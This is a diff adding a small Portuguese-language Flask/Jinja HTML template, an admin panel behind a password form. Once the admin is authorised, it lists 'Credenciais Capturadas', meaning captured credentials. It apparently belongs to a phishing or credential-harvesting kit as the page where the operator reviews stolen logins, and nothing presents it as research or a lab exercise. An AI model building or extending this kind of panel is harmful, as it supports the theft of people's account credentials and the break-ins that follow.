@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Painel Admin</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <div class="container">
+    <div class="box">
+      <h2>Painel Admin</h2>
+      {% if authorized %}
+        <h3>Credenciais Capturadas:</h3>
+        <ul>
+          {% for line in logins %}
+            <li>{{ line }}</li>
+          {% endfor %}
+        </ul>
+      {% else %}
+        <form method="POST">
+          <input type="password" name="admin_pass" placeholder="Senha do admin" required>
+          <button type="submit">Entrar</button>
+        </form>
+        {% if error %}
+          <div class="error">{{ error }}</div>
+        {% endif %}
+      {% endif %}
+    </div>
+  </div>
+</body>
+</html>
